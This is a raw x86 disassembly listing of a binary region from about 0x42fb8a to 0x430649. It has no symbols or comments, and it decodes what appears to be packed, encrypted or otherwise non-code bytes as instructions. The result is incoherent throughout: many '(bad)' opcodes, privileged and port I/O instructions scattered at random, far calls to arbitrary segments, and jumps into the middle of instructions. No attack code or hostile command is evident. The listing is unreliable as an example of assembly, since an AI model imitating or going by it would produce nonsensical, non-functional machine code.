  42fb8a:	outs   dx,BYTE PTR ds:[esi]
  42fb8b:	rcl    BYTE PTR [edi],0xbe
  42fb8e:	aam    0xb7
  42fb90:	cmc    
  42fb91:	cdq    
  42fb92:	xchg   BYTE PTR [edx+0x26],dl
  42fb95:	adc    esp,DWORD PTR [edi+ebx*1+0x4d29664f]
  42fb9c:	movaps XMMWORD PTR [esi],xmm7
  42fb9f:	dec    eax
  42fba0:	mov    esi,0x85dda0fe
  42fba5:	call   0x9a1f:0x47ca9bea
  42fbac:	sub    DWORD PTR [eax+0x3674b51c],ecx
  42fbb2:	add    BYTE PTR [ebx],dl
  42fbb4:	loope  0x42fbb4
  42fbb6:	ds stc 
  42fbb8:	test   BYTE PTR [ecx-0x2d00a670],cl
  42fbbe:	ficomp WORD PTR [edx+eiz*1-0x68]
  42fbc2:	lea    eax,[ecx+0xc]
  42fbc5:	and    DWORD PTR [ecx],0x362862a9
  42fbcb:	mov    eax,ds:0xfd06dbe
  42fbd0:	add    esp,edx
  42fbd2:	fldenv [ebp+0x25a0f649]
  42fbd8:	and    al,0x58
  42fbda:	and    eax,DWORD PTR [ebp+0x66]
  42fbdd:	add    BYTE PTR [edx+0x20],0x67
  42fbe1:	push   edi
  42fbe2:	xor    ah,BYTE PTR [ebx-0x2c]
  42fbe5:	aas    
  42fbe6:	add    eax,DWORD PTR [edi+0x46a40ff3]
  42fbec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbed:	bound  esp,QWORD PTR [edx+edx*4+0xeeb68da]
  42fbf4:	lods   eax,DWORD PTR ds:[esi]
  42fbf5:	fwait
  42fbf6:	sbb    eax,0xe4cc3103
  42fbfb:	sti    
  42fbfc:	or     cl,ch
  42fbfe:	sbb    DWORD PTR [ebx],0xffffffe4
  42fc01:	in     eax,0xda
  42fc03:	es jb  0x42fba3
  42fc06:	out    0xf9,al
  42fc08:	jbe    0x42fbb5
  42fc0a:	sub    BYTE PTR [ecx-0x42],ah
  42fc0d:	iret   
  42fc0e:	inc    ecx
  42fc0f:	mov    al,ah
  42fc11:	(bad)  
  42fc12:	test   eax,0xc9105fe4
  42fc17:	arpl   cx,di
  42fc19:	lock and al,BYTE PTR [edi+0x20d21f4c]
  42fc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc21:	sub    DWORD PTR [ecx-0xf],esi
  42fc24:	sbb    BYTE PTR [edx],cl
  42fc26:	shl    eax,1
  42fc28:	sub    al,BYTE PTR [ebp-0xd]
  42fc2b:	cli    
  42fc2c:	jne    0x42fbf5
  42fc2e:	add    al,0x23
  42fc30:	sub    ch,al
  42fc32:	jno    0x42fc2f
  42fc34:	ja     0x42fc3e
  42fc36:	into   
  42fc37:	cmc    
  42fc38:	ror    DWORD PTR [edi-0x5b],0x6c
  42fc3c:	pop    edx
  42fc3d:	hlt    
  42fc3e:	or     esi,ecx
  42fc40:	add    dl,BYTE PTR ds:0x0
	...
  42fcb2:	add    BYTE PTR [eax],al
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0xd4534ab9
  42fcc3:	pop    ebp
  42fcc4:	push   esi
  42fcc5:	stc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	test   BYTE PTR [eax],0x0
  42fccb:	add    BYTE PTR [esi-0x12],bh
  42fcce:	xchg   esp,eax
  42fccf:	cs xchg ecx,eax
  42fcd1:	out    0x54,eax
  42fcd3:	add    ebp,esi
  42fcd5:	xchg   ecx,eax
  42fcd6:	push   0x4a0b0171
  42fcdb:	iret   
  42fcdc:	stos   DWORD PTR es:[edi],eax
  42fcdd:	push   ds
  42fcde:	test   DWORD PTR [edx-0x57],edi
  42fce1:	dec    eax
  42fce2:	add    eax,0x52043868
  42fce7:	out    0x52,al
  42fce9:	dec    ebp
  42fcea:	jns    0x42fcd0
  42fcec:	pop    edx
  42fced:	icebp  
  42fcee:	stc    
  42fcef:	pop    esi
  42fcf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcf1:	ins    BYTE PTR es:[edi],dx
  42fcf2:	add    al,0x7a
  42fcf4:	add    DWORD PTR [edi+0x635fd608],ebx
  42fcfa:	pusha  
  42fcfb:	outs   dx,BYTE PTR ds:[esi]
  42fcfc:	mov    ds:0xcd4b6021,eax
  42fd01:	loopne 0x42fd01
  42fd03:	loop   0x42fce2
  42fd05:	mov    ds:0x47f90651,eax
  42fd0a:	inc    edx
  42fd0b:	sbb    eax,0xdafbf7ee
  42fd10:	in     eax,dx
  42fd11:	clc    
  42fd12:	lahf   
  42fd13:	mov    ds:0xbdf90f76,al
  42fd18:	ror    BYTE PTR [edi-0x777a6adb],1
  42fd1e:	ins    DWORD PTR es:[edi],dx
  42fd1f:	cs push esp
  42fd21:	mov    dh,0x6c
  42fd23:	xchg   ecx,eax
  42fd24:	cmp    eax,0x29e1a72d
  42fd29:	push   edx
  42fd2a:	retf   
  42fd2b:	std    
  42fd2c:	fimul  DWORD PTR [eax+0x50f5f69e]
  42fd32:	jno    0x42fd84
  42fd34:	mov    eax,DWORD PTR [edi]
  42fd36:	(bad)  
  42fd37:	xchg   esp,eax
  42fd38:	mov    eax,0x3b26430f
  42fd3d:	xchg   edi,eax
  42fd3e:	sub    edx,eax
  42fd40:	sbb    eax,DWORD PTR [ecx+0x51]
  42fd43:	inc    ebp
  42fd44:	xor    cl,ah
  42fd46:	rol    edi,0xae
  42fd49:	mov    cl,0xea
  42fd4b:	pop    ebx
  42fd4c:	dec    ecx
  42fd4d:	popa   
  42fd4e:	es sbb al,0x65
  42fd51:	mov    ecx,0xbc61c8c8
  42fd56:	xor    al,0xc9
  42fd58:	popa   
  42fd59:	cmp    dl,BYTE PTR [esi-0x38]
  42fd5c:	es je  0x42fd62
  42fd5f:	dec    edi
  42fd60:	fsub   st,st(7)
  42fd62:	or     al,0xec
  42fd64:	mov    ds:0xc3964479,al
  42fd69:	xchg   esi,eax
  42fd6a:	popf   
  42fd6b:	jae    0x42fd82
  42fd6d:	adc    bl,dl
  42fd6f:	mov    BYTE PTR [ebx-0x9],bh
  42fd72:	or     eax,0xfd0b2550
  42fd77:	push   ds
  42fd78:	jmp    0xaec1:0xd3a2ad70
  42fd7f:	jg     0x42fd45
  42fd81:	pop    ebp
  42fd82:	mov    ds:0x2cb393a9,eax
  42fd87:	lahf   
  42fd88:	sub    BYTE PTR [ebp+0x58],ch
  42fd8b:	add    DWORD PTR [ebp+0x616edc6],ebx
  42fd91:	and    BYTE PTR [esi+edi*1-0x879cc11],bl
  42fd98:	mov    ds:0x93b7f40f,al
  42fd9d:	(bad)  
  42fd9e:	sbb    ecx,DWORD PTR [edx-0x3b]
  42fda1:	mov    ds:0x2358f79f,eax
  42fda6:	mov    bl,BYTE PTR [edx-0x32cf613a]
  42fdac:	sbb    BYTE PTR [edx+0x1],0x4
  42fdb0:	inc    edx
  42fdb1:	ja     0x42fe1e
  42fdb3:	iret   
  42fdb4:	sub    BYTE PTR [esi+0x59399de1],bl
  42fdba:	dec    ebp
  42fdbb:	fcom   DWORD PTR [eax+ecx*1+0x1]
  42fdbf:	pop    ebx
  42fdc0:	in     al,0x85
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	fnstenv [ebx*1+0x1fa4ca2]
  42fe47:	add    dh,dh
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    dh,al
  42fe4d:	fimul  WORD PTR [eax+0x782d0b55]
  42fe53:	adc    eax,0xd5a55ecb
  42fe58:	scas   eax,DWORD PTR es:[edi]
  42fe59:	mov    ds:0x4e500153,al
  42fe5e:	enter  0x49c5,0x9d
  42fe62:	adc    al,0x2e
  42fe64:	fadd   st(7),st
  42fe66:	in     al,dx
  42fe67:	sbb    BYTE PTR [ebx+0x49d05007],dh
  42fe6d:	xor    DWORD PTR [ecx],0xab9c9f9e
  42fe73:	icebp  
  42fe74:	pop    ecx
  42fe75:	push   ds
  42fe76:	in     al,dx
  42fe77:	dec    ebp
  42fe78:	sub    BYTE PTR [ecx+0x40],ah
  42fe7b:	lea    edi,[esi]
  42fe7d:	push   esi
  42fe7e:	sbb    BYTE PTR [esi+0x4c993c1],dh
  42fe84:	shr    edi,cl
  42fe86:	mov    ah,0xab
  42fe88:	lods   al,BYTE PTR ds:[esi]
  42fe89:	call   0x652a:0x1089fb3d
  42fe90:	push   edi
  42fe91:	je     0x42fede
  42fe93:	add    ch,al
  42fe95:	mul    DWORD PTR [ecx+0x7c]
  42fe98:	ret    
  42fe99:	cmp    ah,BYTE PTR [ebp-0xb]
  42fe9c:	push   edi
  42fe9d:	mov    dh,0x91
  42fe9f:	sub    DWORD PTR [edx+ebp*2+0x1c],edi
  42fea3:	cli    
  42fea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fea5:	mov    eax,ds:0x540ff8a4
  42feaa:	dec    ecx
  42feab:	cld    
  42feac:	or     esp,DWORD PTR ds:0x4aa6afd0
  42feb2:	ret    0x560e
  42feb5:	sbb    eax,0x8bf3b300
  42feba:	aam    0xae
  42febc:	frstor [edi-0x43436c90]
  42fec2:	push   ebx
  42fec3:	popf   
  42fec4:	inc    ebx
  42fec5:	aaa    
  42fec6:	mov    ebx,0x2d32e700
  42fecb:	lods   eax,DWORD PTR ds:[esi]
  42fecc:	pusha  
  42fecd:	out    0x40,eax
  42fecf:	sub    ch,al
  42fed1:	sub    al,0x82
  42fed3:	(bad)  
  42fed4:	xchg   ecx,eax
  42fed5:	arpl   WORD PTR [edi-0x21],bp
  42fed8:	imul   edi,DWORD PTR [eax-0x4b],0xffffffcd
  42fedc:	lods   eax,DWORD PTR ds:[esi]
  42fedd:	pop    es
  42fede:	(bad)  
  42fedf:	sbb    BYTE PTR [edi-0x45],bl
  42fee2:	ins    DWORD PTR es:[edi],dx
  42fee3:	stc    
  42fee4:	and    al,0xd1
  42fee6:	lds    edi,FWORD PTR [edi+0xc73c2fe]
  42feec:	lahf   
  42feed:	mov    ds:0xda939f72,eax
  42fef2:	fisttp DWORD PTR [edi-0x2f3d2c74]
  42fef8:	pushf  
  42fef9:	dec    eax
  42fefa:	jge    0x42fee8
  42fefc:	repz sub eax,0x92ee154c
  42ff02:	or     eax,0xc1b36e79
  42ff07:	mov    ah,0xe9
  42ff09:	ror    DWORD PTR [ebx-0x18],0xf0
  42ff0d:	hlt    
  42ff0e:	mov    dl,0x4
  42ff10:	fwait
  42ff11:	pop    edi
  42ff12:	jns    0x42ff1b
  42ff14:	test   al,0xf5
  42ff16:	mov    ebx,0x63691307
  42ff1b:	inc    esp
  42ff1c:	or     cl,BYTE PTR [ebp-0x39ccf97a]
  42ff22:	xor    eax,eax
  42ff24:	dec    ebp
  42ff25:	dec    ebp
  42ff26:	es dec ebx
  42ff28:	mov    eax,0x3c1709e2
  42ff2d:	mov    WORD PTR [ecx-0x5a2070cb],ss
  42ff33:	mov    edi,0xc5dc8a0
  42ff38:	adc    DWORD PTR [eax],esp
  42ff3a:	bnd jo 0x42ffb0
  42ff3d:	mov    dh,0xe4
  42ff3f:	aaa    
  42ff40:	popa   
  42ff41:	adc    eax,0x0
	...
  42ffb2:	add    BYTE PTR [eax],al
  42ffb4:	adc    bh,BYTE PTR [esi]
  42ffb6:	int    0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0x40768016]
  42ffc1:	push   ecx
  42ffc2:	lods   al,BYTE PTR ds:[esi]
  42ffc3:	or     al,0x42
  42ffc5:	sti    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	test   BYTE PTR [eax],0x0
  42ffcb:	add    BYTE PTR [ecx+0x3e],cl
  42ffce:	xor    BYTE PTR [ebx],bh
  42ffd0:	jbe    0x43001e
  42ffd2:	addr16 (bad) 
  42ffd4:	mov    ecx,DWORD PTR [ebp-0x19]
  42ffd7:	aam    0x8f
  42ffd9:	push   cs
  42ffda:	xchg   esp,eax
  42ffdb:	out    0x68,al
  42ffdd:	and    edx,eax
  42ffdf:	std    
  42ffe0:	mov    bl,0xae
  42ffe2:	sbb    BYTE PTR [edx],dh
  42ffe4:	jne    0x42ff75
  42ffe6:	xchg   edx,eax
  42ffe7:	mov    ebp,0x80decfc9
  42ffec:	int3   
  42ffed:	add    al,al
  42ffef:	div    DWORD PTR [edx+ebx*1+0x4d]
  42fff3:	sub    bh,bl
  42fff5:	pop    ss
  42fff6:	add    ah,dl
  42fff8:	imul   DWORD PTR [esi+esi*2-0x7914a8e2]
  42ffff:	inc    eax
  430000:	adc    al,BYTE PTR [edx]
  430002:	sbb    eax,0x2b39a264
  430007:	cli    
  430008:	mov    ebx,DWORD PTR fs:[edi-0x43ed3869]
  43000f:	ins    BYTE PTR es:[edi],dx
  430010:	ffree  st(1)
  430012:	call   0x87cc:0xe2e00de3
  430019:	mov    fs,WORD PTR [edx]
  43001b:	adc    al,0xbb
  43001d:	mov    ebx,0x2d2c48cf
  430022:	pop    ecx
  430023:	add    BYTE PTR [eax-0x153a3a9e],ah
  430029:	xchg   DWORD PTR [ecx],eax
  43002b:	pop    esp
  43002c:	or     ch,BYTE PTR fs:[ebx-0x69]
  430030:	sbb    eax,0xb32a0720
  430035:	mov    cl,0x15
  430037:	mov    eax,0x704f426c
  43003c:	dec    esp
  43003d:	test   al,0xfd
  43003f:	mov    dh,0x8f
  430041:	jge    0x4300ac
  430043:	cmp    BYTE PTR [ecx+0x258dbaf2],bl
  430049:	int3   
  43004a:	repnz add ebx,ebx
  43004d:	scas   al,BYTE PTR es:[edi]
  43004e:	sbb    BYTE PTR [ebp+0x54],0x9c
  430052:	mov    ebp,0xb779e184
  430057:	test   dl,0x93
  43005a:	or     eax,0x81cce24a
  43005f:	retf   0x31ea
  430062:	or     eax,0x2aee334e
  430067:	shl    dl,cl
  430069:	sub    edi,DWORD PTR [ebp-0x44c1bf05]
  43006f:	loopne 0x42fff2
  430071:	in     eax,dx
  430072:	jns    0x4300d5
  430074:	sbb    BYTE PTR [ebp-0x53f69d0e],ch
  43007a:	xchg   ebx,eax
  43007b:	xor    ecx,DWORD PTR [ebx+0x1feefa65]
  430081:	jmp    0x1b11:0x32183f9c
  430088:	out    dx,eax
  430089:	pop    es
  43008a:	aas    
  43008b:	fisub  WORD PTR [ecx]
  43008d:	or     eax,0x9422f1c6
  430092:	ret    
  430093:	and    eax,0x198d18c3
  430098:	fisubr WORD PTR [edx+ebx*2]
  43009b:	jae    0x4300ab
  43009d:	xchg   ebx,eax
  43009e:	jecxz  0x430064
  4300a0:	jae    0x43007b
  4300a2:	sbb    BYTE PTR [ebp+0x9],al
  4300a5:	lahf   
  4300a6:	daa    
  4300a7:	push   0x8ec2887e
  4300ac:	xlat   BYTE PTR ds:[ebx]
  4300ad:	mov    cl,0xdd
  4300af:	pop    ss
  4300b0:	jne    0x430111
  4300b2:	retf   0xc10a
  4300b5:	enter  0x1dac,0x1e
  4300b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4300ba:	push   esp
  4300bb:	xchg   esi,eax
  4300bc:	mov    dl,0x27
  4300be:	loop   0x430094
  4300c0:	mov    DWORD PTR [eax+0x0],ebp
	...
  430133:	add    BYTE PTR [edx+0x26],bl
  430136:	jecxz  0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0xaef0:0x3023a608
  430144:	cmp    ah,bh
  430146:	add    DWORD PTR [eax],eax
  430148:	test   BYTE PTR [eax],0x0
  43014b:	add    BYTE PTR [edi+0x6de5e595],al
  430151:	shl    dl,cl
  430153:	mov    dl,0x48
  430155:	inc    ebp
  430156:	out    0xc9,eax
  430158:	xor    eax,0x655dcf0e
  43015d:	scas   al,BYTE PTR es:[edi]
  43015e:	push   ecx
  43015f:	or     eax,edi
  430161:	pushf  
  430162:	add    cl,dh
  430164:	mov    bh,0x91
  430166:	retf   
  430167:	inc    edx
  430168:	and    bh,BYTE PTR [esi]
  43016a:	ins    BYTE PTR es:[edi],dx
  43016b:	and    eax,0xe0119ec8
  430170:	xchg   ebp,eax
  430171:	add    eax,0x9d18e15
  430176:	into   
  430177:	in     eax,0x92
  430179:	nop
  43017a:	clc    
  43017b:	mov    ?,WORD PTR ss:[ecx-0x44]
  43017f:	sti    
  430180:	jae    0x4301a1
  430182:	pop    es
  430183:	xchg   ebp,eax
  430184:	test   cl,0x93
  430187:	addr16 mov al,0x83
  43018b:	push   ss
  43018c:	(bad)  
  43018d:	mov    dh,0xc4
  43018f:	call   0x7190:0x604f0940
  430196:	pop    ecx
  430197:	div    DWORD PTR [edx+0x60]
  43019a:	or     eax,0xd4a1131f
  43019f:	or     eax,0xe8948a14
  4301a4:	jo     0x430150
  4301a6:	repz adc eax,0xbe075d15
  4301ac:	mov    bl,0x11
  4301ae:	cwde   
  4301af:	int    0x4f
  4301b1:	jne    0x4301eb
  4301b3:	(bad)  
  4301b4:	and    al,0x49
  4301b6:	(bad)  [esi-0x4a]
  4301b9:	jmp    0x43019f
  4301bb:	scas   al,BYTE PTR es:[edi]
  4301bc:	mov    ebx,0xc5f411bc
  4301c1:	push   ecx
  4301c2:	jne    0x43016b
  4301c4:	adc    edi,DWORD PTR [esi]
  4301c6:	xor    eax,0x347a43da
  4301cb:	(bad)  
  4301cc:	push   0xe26654e3
  4301d1:	test   al,0xc5
  4301d3:	sbb    eax,0xe6345036
  4301d8:	fwait
  4301d9:	stc    
  4301da:	pop    edi
  4301db:	(bad)  
  4301dc:	sbb    esi,DWORD PTR [ebx-0x3793ce01]
  4301e2:	inc    esp
  4301e3:	jp     0x430169
  4301e5:	test   eax,0x2de88b6c
  4301ea:	jg     0x4301a8
  4301ec:	js     0x430249
  4301ee:	mov    al,ds:0x3d666
  4301f3:	sbb    dh,BYTE PTR [ecx-0x2cbad825]
  4301f9:	ds mov bl,0xdb
  4301fc:	sbb    al,0xf4
  4301fe:	sub    esp,esp
  430200:	mov    cl,0x32
  430202:	xlat   BYTE PTR ds:[ebx]
  430203:	adc    DWORD PTR [ecx+0x9],0x44
  430207:	push   cs
  430208:	dec    edi
  430209:	cmp    eax,0x50bcd6ca
  43020e:	sbb    eax,0x59b3931a
  430213:	add    al,0x35
  430215:	daa    
  430216:	mov    ecx,0xabf5a3eb
  43021b:	not    DWORD PTR [ebx]
  43021d:	jg     0x4301a7
  43021f:	sub    eax,0x2d760656
  430224:	push   esi
  430225:	xor    ebp,DWORD PTR [edx-0x46]
  430228:	and    BYTE PTR [ecx-0x5edd1d3],dh
  43022e:	sub    BYTE PTR [edi+0x25],0xf3
  430232:	adc    eax,0x75a0d489
  430237:	xchg   BYTE PTR [ecx],ah
  430239:	xor    edi,DWORD PTR [ecx-0x32db6764]
  43023f:	cdq    
  430240:	lods   ax,WORD PTR ds:[esi]
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	xchg   ebx,eax
  4302c1:	shl    DWORD PTR [ebx],1
  4302c3:	shr    BYTE PTR [esi],cl
  4302c5:	std    
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	test   BYTE PTR [eax],0x0
  4302cb:	add    BYTE PTR [ebx-0x1046e5fe],dl
  4302d1:	ret    0x9dca
  4302d4:	mov    edx,ss
  4302d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4302d7:	xor    edx,esp
  4302d9:	adc    bl,BYTE PTR [ebx]
  4302db:	repz adc eax,0x24817af4
  4302e1:	xchg   edi,eax
  4302e2:	push   eax
  4302e3:	(bad)
  4302e6:	in     al,0xac
  4302e8:	xlat   BYTE PTR ds:[ebx]
  4302e9:	repz test al,0x7
  4302ec:	push   es
  4302ed:	(bad)  
  4302ee:	sbb    DWORD PTR [ecx],esi
  4302f0:	test   al,0x61
  4302f2:	adc    eax,0x7a205762
  4302f7:	cld    
  4302f8:	mov    eax,0x16bd89d0
  4302fd:	mov    al,BYTE PTR [ebp+0x6a]
  430300:	sbb    ebp,esp
  430302:	out    dx,eax
  430303:	out    0x2c,al
  430305:	cmp    eax,0x750ace37
  43030a:	cmp    dh,BYTE PTR [esi+0x6a715c4e]
  430310:	xchg   ecx,eax
  430311:	sbb    cl,BYTE PTR [edx-0x5a12930c]
  430317:	arpl   sp,bp
  430319:	inc    ebp
  43031a:	lods   al,BYTE PTR ds:[esi]
  43031b:	jo     0x430310
  43031d:	mov    esi,0x4f0e7c53
  430322:	dec    ebp
  430323:	mov    BYTE PTR [eax-0x5cd6572a],bh
  430329:	iret   
  43032a:	xchg   ebx,eax
  43032b:	sub    eax,0x36493264
  430330:	fistp  WORD PTR [ecx+0x4e]
  430333:	fisub  WORD PTR [ecx-0x34]
  430336:	jle    0x430364
  430338:	aas    
  430339:	mov    dh,0xd1
  43033b:	push   edx
  43033c:	jge    0x6fd201ad
  430342:	sti    
  430343:	xor    DWORD PTR [ebx-0x70072937],esi
  430349:	repz pop eax
  43034b:	jg     0x430314
  43034d:	and    DWORD PTR [eax-0x6d],ecx
  430350:	ret    
  430351:	in     al,dx
  430352:	sar    edi,1
  430354:	add    eax,0x1c7edcb0
  430359:	aam    0xdd
  43035b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43035c:	cld    
  43035d:	and    eax,0x453893a5
  430362:	sub    eax,0xe01b8205
  430367:	cs sbb al,bh
  43036a:	jecxz  0x4303a2
  43036c:	fsubr  DWORD PTR [edi-0x73]
  43036f:	leave  
  430370:	jno    0x4302f2
  430372:	mov    dl,0x5
  430374:	clc    
  430375:	xchg   BYTE PTR [eax+0x22],bh
  430378:	push   0xfbfa4989
  43037d:	xor    al,BYTE PTR [ebp-0x642ddc2b]
  430383:	cmp    esp,DWORD PTR [ecx]
  430385:	call   0x5996622c
  43038a:	fisttp QWORD PTR [di-0x49d3]
  43038f:	dec    ebx
  430390:	and    BYTE PTR [esi],0x3f
  430393:	mov    ds:0xf74de172,eax
  430398:	cmp    al,cl
  43039a:	push   0x8ca5a35f
  43039f:	(bad)
  4303a2:	push   edx
  4303a3:	mov    al,0x92
  4303a5:	jmp    DWORD PTR [edx+0x19]
  4303a8:	pop    ebx
  4303a9:	and    eax,DWORD PTR [edi+edx*1-0x5b]
  4303ad:	mov    cl,BYTE PTR [ebx+0x2411c7a6]
  4303b3:	cdq    
  4303b4:	pop    eax
  4303b5:	dec    eax
  4303b6:	mov    ebp,0x87b84551
  4303bb:	repz scas al,BYTE PTR es:[edi]
  4303bd:	cs push ds
  4303bf:	loop   0x4303a5
  4303c1:	pop    ecx
	...
  430432:	add    BYTE PTR [eax],al
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfe24:0xcf2b67aa
  430446:	add    DWORD PTR [eax],eax
  430448:	test   BYTE PTR [eax],0x0
  43044b:	add    cl,ch
  43044d:	inc    edi
  43044e:	adc    BYTE PTR [eax-0x6c],dh
  430451:	sbb    eax,0x830fac00
  430456:	xor    DWORD PTR [eax],edi
  430458:	dec    esp
  430459:	push   ebp
  43045a:	test   DWORD PTR [edi],0xa495d3ad
  430460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430461:	stc    
  430462:	das    
  430463:	adc    al,BYTE PTR [ebx]
  430465:	fidiv  WORD PTR [esi]
  430467:	mov    edi,0x5a1d48c
  43046c:	inc    esi
  43046d:	mov    esi,0x1512e076
  430472:	sbb    esi,eax
  430474:	xor    ch,BYTE PTR [ecx]
  430476:	sti    
  430477:	xchg   edi,eax
  430478:	mov    ecx,0xc7cba73b
  43047d:	fimul  DWORD PTR [ecx+eax*8+0x6]
  430481:	(bad)  [edi-0x4dfd839d]
  430487:	fs xchg ebx,eax
  430489:	pop    esp
  43048a:	push   0x1d
  43048c:	push   esi
  43048d:	jle    0x43049a
  43048f:	jg     0x43048f
  430491:	lock pop eax
  430493:	cli    
  430494:	mov    ds:0xf3eac098,eax
  430499:	xchg   edi,eax
  43049a:	push   esp
  43049b:	inc    edi
  43049c:	jl     0x43045f
  43049e:	retf   
  43049f:	pop    ebx
  4304a0:	push   edx
  4304a1:	mov    dl,cl
  4304a3:	sub    DWORD PTR [edi],ebp
  4304a5:	repz dec edx
  4304a7:	fisubr WORD PTR [ecx-0x3f]
  4304aa:	and    al,0x3
  4304ac:	mov    ds:0xf8b83dbb,al
  4304b1:	shl    BYTE PTR [edi],0x8d
  4304b4:	pop    ebx
  4304b5:	test   al,0x70
  4304b7:	dec    ecx
  4304b8:	push   ebp
  4304b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4304ba:	add    eax,DWORD PTR [ecx-0x30]
  4304bd:	sbb    al,0xce
  4304bf:	rol    BYTE PTR [ebx-0xf],0xab
  4304c3:	and    al,0xe1
  4304c5:	test   al,0x4f
  4304c7:	lds    esp,FWORD PTR [ecx+edx*4-0x4305294d]
  4304ce:	fistp  WORD PTR [edi]
  4304d0:	fcomp  st(4)
  4304d2:	sbb    al,BYTE PTR [ebx]
  4304d4:	dec    ebp
  4304d5:	outs   dx,DWORD PTR ds:[esi]
  4304d6:	push   ebp
  4304d7:	mov    ss,esi
  4304d9:	push   ebp
  4304da:	inc    ebp
  4304db:	out    dx,eax
  4304dc:	push   ds
  4304dd:	and    eax,0x443f6d74
  4304e2:	pop    ebx
  4304e3:	xchg   edx,eax
  4304e4:	nop
  4304e5:	fdiv   DWORD PTR [ebx+0x7f9fe53b]
  4304eb:	push   es
  4304ec:	arpl   WORD PTR ds:0x17910e8b,cx
  4304f2:	int    0x7b
  4304f4:	test   BYTE PTR ds:[edi+ebp*1+0x31],bh
  4304f9:	push   cs
  4304fa:	pop    edx
  4304fb:	push   es
  4304fc:	push   ecx
  4304fd:	xor    esp,ecx
  4304ff:	jle    0x4304ea
  430501:	cmp    ah,bl
  430503:	pop    ss
  430504:	js     0x43049f
  430506:	mov    al,ds:0xc62771bc
  43050b:	imul   esi,DWORD PTR [ecx+0x30],0x66
  43050f:	out    dx,eax
  430510:	dec    ebp
  430511:	jg     0x430572
  430513:	scas   eax,DWORD PTR es:[edi]
  430514:	xor    al,0x7f
  430516:	stc    
  430517:	jo     0x430519
  430519:	mov    al,0x5d
  43051b:	das    
  43051c:	sub    eax,0x2c7cfbbc
  430521:	push   ecx
  430522:	ret    0xf029
  430525:	mov    al,0x95
  430527:	scas   eax,DWORD PTR es:[edi]
  430528:	in     eax,dx
  430529:	repz add DWORD PTR [esi],ebp
  43052c:	loop   0x4304ee
  43052e:	jp     0x430556
  430530:	cmp    eax,0x47e7025b
  430535:	mov    eax,ds:0x118234d5
  43053a:	int3   
  43053b:	daa    
  43053c:	or     edi,ebp
  43053e:	push   esi
  43053f:	scas   eax,DWORD PTR es:[edi]
  430540:	(bad)  
  430541:	or     al,BYTE PTR [eax]
	...
  4305b3:	add    BYTE PTR [esi],bh
  4305b5:	push   esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi+0x55]
  4305c1:	out    0x75,eax
  4305c3:	add    BYTE PTR [edx],bl
  4305c5:	inc    DWORD PTR [ecx]
  4305c7:	add    dh,dh
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    BYTE PTR [ebp+0x72bd3d5a],dl
  4305d1:	pop    ds
  4305d2:	push   ecx
  4305d3:	push   edi
  4305d4:	retf   0xd4e1
  4305d7:	pop    ebp
  4305d8:	push   es
  4305d9:	mov    dl,0x6
  4305db:	push   es
  4305dc:	adc    eax,0x9c865233
  4305e1:	pop    edx
  4305e2:	xor    al,0xd7
  4305e4:	push   eax
  4305e5:	(bad)  
  4305e6:	fwait
  4305e7:	xor    al,0xe1
  4305e9:	hlt    
  4305ea:	sbb    BYTE PTR [edi-0x5ec4bc25],cl
  4305f0:	jmp    esp
  4305f2:	arpl   WORD PTR ds:0x4dbb130,bp
  4305f8:	mov    bh,0xbd
  4305fa:	jns    0x430625
  4305fc:	clc    
  4305fd:	pop    edx
  4305fe:	or     cl,BYTE PTR [edx+eiz*1]
  430601:	push   eax
  430602:	fisttp DWORD PTR [edx-0xfd20b04]
  430608:	pop    edx
  430609:	ins    DWORD PTR es:[edi],dx
  43060a:	loop   0x430630
  43060c:	pop    ds
  43060d:	and    cl,0xd5
  430610:	jo     0x430596
  430612:	pop    es
  430613:	mov    dh,0xd0
  430615:	or     BYTE PTR [ebp+0x16e2f41],bh
  43061b:	mov    al,ds:0xca65964b
  430620:	retf   0x6c0d
  430623:	test   al,0x1e
  430625:	fcmovnb st,st(7)
  430627:	xor    ecx,eax
  430629:	pop    edx
  43062a:	cmp    eax,0x6a42a9fc
  43062f:	ficom  WORD PTR [ecx-0x6a51fcc6]
  430635:	adc    BYTE PTR [ebx-0x3c75cda4],0x77
  43063c:	jge    0x430695
  43063e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43063f:	mov    bl,dl
  430641:	mov    WORD PTR [eax+0x60],ds
  430644:	mov    ebx,0xafc41e27
  430649:	and    ecx,DWORD PTR [eax-0x26c49088]
